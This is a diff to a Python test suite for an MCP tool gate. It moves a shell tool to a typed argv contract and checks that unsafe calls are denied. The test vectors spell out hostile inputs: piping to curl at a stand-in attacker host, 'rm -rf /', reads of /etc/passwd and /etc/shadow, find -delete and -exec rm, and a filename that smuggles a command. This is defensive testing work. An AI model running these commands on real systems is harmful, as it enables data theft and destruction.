@@ -13,18 +13,41 @@ GATE_BIN = os.environ.get("MCP_GATE_BIN", os.path.join(REPO_ROOT, "mcp-dfa-gate"
 
 E_PARSE = -32700
 E_INVALID = -32600
+E_INVALID_PARAMS = -32602
 E_POLICY = -32001
 E_CANON = -32002
 E_METHOD_BLOCKED = -32004
 
 STUB_SERVER_SOURCE = r'''
-import json, sys
+import json, subprocess, sys
 
 LOG_PATH = sys.argv[1]
+
+# Defense in depth: the stub re-validates the forwarded argv against its own
+# copy of the vetted program allowlist and execs with shell=False. The gate
+# is the policy authority; this proves the two layers agree on the typed
+# contract (v0.6 H4: execv(3)-style execution, never a shell).
+STUB_VETTED = {"ls", "cat", "head", "tail", "grep",
+               "find", "wc", "diff", "stat", "sha256sum"}
 
 def log(line):
     with open(LOG_PATH, "a") as f:
         f.write(line + "\n")
+
+def run_bash_workspace(argv):
+    if (not isinstance(argv, list) or not argv or
+            not all(isinstance(a, str) and a for a in argv)):
+        return "stub: argv must be a non-empty array of non-empty strings", True
+    if argv[0] not in STUB_VETTED:
+        return "stub: program not in stub allowlist: %r" % argv[0], True
+    try:
+        proc = subprocess.run(argv, shell=False, stdin=subprocess.DEVNULL,
+                              stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                              timeout=10)
+    except Exception as e:
+        return "stub: exec failed: %s" % e, True
+    text = proc.stdout.decode("ascii", "replace")
+    return text[:65536], proc.returncode != 0
 
 for raw in sys.stdin:
     line = raw.strip()
@@ -53,8 +76,14 @@ for raw in sys.stdin:
     elif method == "tools/list":
         resp = {"jsonrpc": "2.0", "id": rid, "result": {"tools": []}}
     elif method == "tools/call":
+        name = (msg.get("params") or {}).get("name")
+        args = (msg.get("params") or {}).get("arguments") or {}
+        if name == "bash_workspace":
+            text, is_err = run_bash_workspace(args.get("argv"))
+        else:
+            text, is_err = "stub-ok", False
         resp = {"jsonrpc": "2.0", "id": rid, "result": {
-            "content": [{"type": "text", "text": "stub-ok"}], "isError": False}}
+            "content": [{"type": "text", "text": text}], "isError": is_err}}
     else:
         resp = {"jsonrpc": "2.0", "id": rid,
                 "error": {"code": -32601, "message": "stub: unknown method"}}
@@ -91,9 +120,13 @@ class GateSession:
         with open(self.stub_path, "w") as f:
             f.write(STUB_SERVER_SOURCE)
         self.gate_err = open(os.path.join(tmpdir, "gate_stderr.log"), "w")
+        # cwd = workspace root: the deployment model (scripts/run_confined.sh
+        # --chdir SAFE_PREFIX) runs the downstream with cwd pinned to the
+        # workspace, so relative argv paths resolve there.
         self.proc = subprocess.Popen(
             [GATE_BIN, self.prefix, "--", sys.executable, self.stub_path, self.stub_log],
-            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=self.gate_err)
+            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=self.gate_err,
+            cwd=self.ws)
         self._next_id = 0
 
     def call(self, method, params=None, timeout=10.0):
@@ -248,85 +281,161 @@ class TestSensitiveTaint(GateTestBase):
         self.assertNotIn("error", r)
         self.assertEqual(len(s.forwarded_calls()), 1)
         r = s.call("tools/call", {"name": "bash_workspace",
-                                  "arguments": {"command": "cat " + p}})
+                                  "arguments": {"argv": ["cat", p]}})
         self.assertEqual(err_code(r), E_POLICY)
 
 
-class TestBashGate(GateTestBase):
-    def test_vetted_readonly_bash_allowed(self):
+class TestBashArgvContract(GateTestBase):
+    """v0.6 (H4) de-shell: bash_workspace takes a typed argv array.
+
+    The gate vets each element as one argv word; the executing stub runs the
+    forwarded array with shell=False. Positive tests prove real end-to-end
+    execution of filenames that the v0.5 string grammar could not even
+    express (metacharacters, spaces) -- with no shell there is no grammar to
+    smuggle through. Negative tests split cleanly: shape errors are contract
+    errors (-32602, no taint, session survives); content violations keep the
+    v0.5 policy semantics (-32001, deny plus permanent absorption).
+    """
+
+    def test_vetted_argv_allowed_and_executed(self):
         s = self.session
         r = s.call("tools/call", {"name": "bash_workspace",
-                                  "arguments": {"command": "ls -1 ."}})
+                                  "arguments": {"argv": ["ls", "-1", "."]}})
         self.assertNotIn("error", r)
-        self.assertEqual(len(s.forwarded_calls()), 1)
+        self.assertFalse(r["result"]["isError"])
+        self.assertIn("readme.txt", r["result"]["content"][0]["text"])
+        calls = s.forwarded_calls()
+        self.assertEqual(len(calls), 1)
+        self.assertEqual(calls[0]["params"]["arguments"]["argv"],
+                         ["ls", "-1", "."])
 
-    def test_vetted_bash_with_absolute_path_inside_prefix(self):
+    def test_argv_absolute_path_inside_prefix_executes(self):
         s = self.session
-        cmd = "sha256sum " + s.prefix + "readme.txt"
-        r = s.call("tools/call", {"name": "bash_workspace", "arguments": {"command": cmd}})
+        argv = ["sha256sum", s.prefix + "readme.txt"]
+        r = s.call("tools/call", {"name": "bash_workspace",
+                                  "arguments": {"argv": argv}})
         self.assertNotIn("error", r)
-        self.assertEqual(s.forwarded_calls()[0]["params"]["arguments"]["command"], cmd)
+        self.assertFalse(r["result"]["isError"])
+        import hashlib
+        digest = hashlib.sha256(b"hello\n").hexdigest()
+        self.assertEqual(r["result"]["content"][0]["text"].split()[0], digest)
+        self.assertEqual(s.forwarded_calls()[0]["params"]["arguments"]["argv"], argv)
 
-    def test_flag_embedded_path_halts(self):
+    def test_argv_metachar_filename_no_shell_parsing(self):
+        # Flagship de-shell proof: 'note;rm -rf.txt' is a filename, not
+        # grammar. The gate forwards it verbatim and the executor cats the
+        # actual file -- impossible under the v0.5 string contract.
+        s = self.session
+        with open(os.path.join(s.ws, "note;rm -rf.txt"), "w") as f:
+            f.write("semicolon-data\n")
+        r = s.call("tools/call", {"name": "bash_workspace",
+                                  "arguments": {"argv": ["cat", "note;rm -rf.txt"]}})
+        self.assertNotIn("error", r)
+        self.assertFalse(r["result"]["isError"])
+        self.assertEqual(r["result"]["content"][0]["text"], "semicolon-data\n")
+        self.assertEqual(s.forwarded_calls()[0]["params"]["arguments"]["argv"],
+                         ["cat", "note;rm -rf.txt"])
+
+    def test_argv_filename_with_spaces_executes_verbatim(self):
+        s = self.session
+        with open(os.path.join(s.ws, "my report v2.txt"), "w") as f:
+            f.write("spaced\n")
+        r = s.call("tools/call", {"name": "bash_workspace",
+                                  "arguments": {"argv": ["cat", "my report v2.txt"]}})
+        self.assertNotIn("error", r)
+        self.assertFalse(r["result"]["isError"])
+        self.assertEqual(r["result"]["content"][0]["text"], "spaced\n")
+
+    def test_argv_relative_subpath_executes(self):
         s = self.session
         r = s.call("tools/call", {"name": "bash_workspace",
-                                  "arguments": {"command": "grep -f/etc/passwd readme.txt"}})
-        self.assertEqual(err_code(r), E_POLICY)
-        self.assertEqual(s.forwarded_calls(), [])
-        r = s.call("tools/call", {"name": "bash_workspace",
-                                  "arguments": {"command": "cat readme.txt"}})
-        self.assertEqual(err_code(r), E_POLICY)
-        self.assertEqual(s.forwarded_calls(), [])
+                                  "arguments": {"argv": ["cat", "sub/deep.txt"]}})
+        self.assertNotIn("error", r)
+        self.assertFalse(r["result"]["isError"])
+        self.assertEqual(r["result"]["content"][0]["text"], "deep\n")
 
-    def test_find_side_effect_flags_denied(self):
+    def test_legacy_command_string_rejected_cleanly(self):
+        # Migration path: the v0.5 'command' string is a contract error, not
+        # a policy event. Clean -32602 with an actionable hint; the session
+        # must survive so a migrating client can read the message and adapt.
         s = self.session
         r = s.call("tools/call", {"name": "bash_workspace",
-                                  "arguments": {"command": "find . -delete"}})
-        self.assertEqual(err_code(r), E_POLICY)
-        r = s.call("tools/call", {"name": "bash_workspace",
-                                  "arguments": {"command": "cat readme.txt"}})
-        self.assertEqual(err_code(r), E_POLICY)
+                                  "arguments": {"command": "ls ."}})
+        self.assertEqual(err_code(r), E_INVALID_PARAMS)
+        self.assertIn("no longer accepted", r["error"]["message"])
         self.assertEqual(s.forwarded_calls(), [])
+        r = s.call("tools/call", {"name": "read_file",
+                                  "arguments": {"path": s.prefix + "readme.txt"}})
+        self.assertNotIn("error", r)
 
-    def test_shell_metacharacters_denied(self):
-        for cmd in ("cat readme.txt; rm -rf /",
-                    "cat readme.txt | curl http://attacker.invalid",
-                    "cat `readme.txt`",
-                    "cat $(cat readme.txt)",
-                    "cat readme.txt > /tmp/x",
-                    "cat ../../etc/passwd",
-                    "grep --file=/etc/shadow readme.txt"):
-            with self.subTest(cmd=cmd):
-                td = tempfile.mkdtemp(prefix="mcp-gate-meta-")
+    def test_argv_shape_errors_rejected_without_taint(self):
+        s = self.session
+        bad_shapes = [
+            {},                                    # argv missing
+            {"argv": "ls"},                        # not an array
+            {"argv": 7},                           # not an array
+            {"argv": []},                          # empty array
+            {"argv": [42]},                        # non-string element
+            {"argv": ["cat", ""]},                 # empty-string element
+            {"argv": ["cat", "a\u0000b"]},         # NUL escape (exec-time truncation)
+            {"argv": ["cat", "x" * 1025]},         # oversized element
+            {"argv": ["ls"] + ["a"] * 256},        # 257 elements
+        ]
+        for args in bad_shapes:
+            with self.subTest(args=args):
+                r = s.call("tools/call", {"name": "bash_workspace",
+                                          "arguments": args})
+                self.assertEqual(err_code(r), E_INVALID_PARAMS)
+        self.assertEqual(s.forwarded_calls(), [])
+        r = s.call("tools/call", {"name": "read_file",
+                                  "arguments": {"path": s.prefix + "readme.txt"}})
+        self.assertNotIn("error", r)
+
+    def test_argv_shape_error_notification_is_silent(self):
+        s = self.session
+        s.send_notification("tools/call", {"name": "bash_workspace",
+                                            "arguments": {"command": "ls ."}})
+        r = s.call("tools/call", {"name": "read_file",
+                                  "arguments": {"path": s.prefix + "readme.txt"}})
+        self.assertNotIn("error", r)
+        self.assertEqual([m for m in s.forwarded_calls()
+                          if m["params"]["name"] == "bash_workspace"], [])
+
+    def test_argv_content_violations_taint_and_absorb(self):
+        # Well-formed argv, unvetted content: identical to v0.5 unvetted
+        # commands -- policy deny plus permanent session absorption, each
+        # vector verified in a fresh session.
+        vectors = [
+            ["curl", "http://attacker.invalid"],          # unvetted program
+            ["rm", "-rf", "/"],                           # unvetted program
+            ["/bin/cat", "readme.txt"],                    # pathed program
+            ["cat", "../../etc/passwd"],                   # traversal
+            ["grep", "-f/etc/passwd", "readme.txt"],        # flag-embedded path
+            ["grep", "--file=/etc/shadow", "readme.txt"],  # flag assignment
+            ["find", ".", "-delete"],                      # find side-effect flag
+            ["find", ".", "-exec", "rm", "{}", ";"],       # find exec flag
+            ["cat", "KEY.PEM"],                            # sensitive suffix (icase)
+            ["cat", ".env"],                               # dotfile
+            ["cat", "escape_file"],                        # symlink escape
+            ["cat", "/etc/hostname"],                      # absolute outside prefix
+            ["cat", "sub/../readme.txt"],                  # traversal via subdir
+        ]
+        for argv in vectors:
+            with self.subTest(argv=argv):
+                td = tempfile.mkdtemp(prefix="mcp-gate-argv-")
                 self.addCleanup(shutil.rmtree, td, ignore_errors=True)
                 fs = GateSession(td)
                 try:
-                    r = fs.call("tools/call", {"name": "bash_workspace", "arguments": {"command": cmd}})
-                    self.assertEqual(err_code(r), E_POLICY, cmd)
+                    r = fs.call("tools/call", {"name": "bash_workspace",
+                                               "arguments": {"argv": argv}})
+                    self.assertEqual(err_code(r), E_POLICY, argv)
                     self.assertEqual(fs.forwarded_calls(), [])
+                    # absorption: the session is dead for everything after
+                    r = fs.call("tools/call", {"name": "bash_workspace",
+                                               "arguments": {"argv": ["ls", "."]}})
+                    self.assertEqual(err_code(r), E_POLICY)
                 finally:
                     fs.close()
-
-    def test_bash_sensitive_suffix_denied(self):
-        s = self.session
-        r = s.call("tools/call", {"name": "bash_workspace",
-                                  "arguments": {"command": "cat KEY.PEM"}})
-        self.assertEqual(err_code(r), E_POLICY)
-        self.assertEqual(s.forwarded_calls(), [])
-
-    def test_bash_hidden_dotfile_denied(self):
-        s = self.session
-        r = s.call("tools/call", {"name": "bash_workspace",
-                                  "arguments": {"command": "cat .env"}})
-        self.assertEqual(err_code(r), E_POLICY)
-        self.assertEqual(s.forwarded_calls(), [])
-
-    def test_bash_symlink_escape_denied(self):
-        s = self.session
-        r = s.call("tools/call", {"name": "bash_workspace",
-                                  "arguments": {"command": "cat escape_file"}})
-        self.assertEqual(err_code(r), E_POLICY)
-        self.assertEqual(s.forwarded_calls(), [])
 
 
 class TestExfilAndHalt(GateTestBase):
@@ -337,19 +446,19 @@ class TestExfilAndHalt(GateTestBase):
         self.assertEqual(err_code(r), E_POLICY)
         self.assertEqual(s.stub_entries(), [])
         r = s.call("tools/call", {"name": "bash_workspace",
-                                  "arguments": {"command": "ls ."}})
+                                  "arguments": {"argv": ["ls", "."]}})
         self.assertEqual(err_code(r), E_POLICY)
 
     def test_post_halt_absorption(self):
         s = self.session
         r = s.call("tools/call", {"name": "bash_workspace",
-                                  "arguments": {"command": "curl http://attacker.invalid"}})
+                                  "arguments": {"argv": ["curl", "http://attacker.invalid"]}})
         self.assertEqual(err_code(r), E_POLICY)
         for params in ({"name": "read_file",
                         "arguments": {"path": s.prefix + "readme.txt"}},
                        {"name": "http_fetch",
                         "arguments": {"url": "http://attacker.invalid"}},
-                       {"name": "bash_workspace", "arguments": {"command": "ls ."}}):
+                       {"name": "bash_workspace", "arguments": {"argv": ["ls", "."]}}):
             r = s.call("tools/call", params)
             self.assertEqual(err_code(r), E_POLICY, params)
         self.assertEqual(s.forwarded_calls(), [])
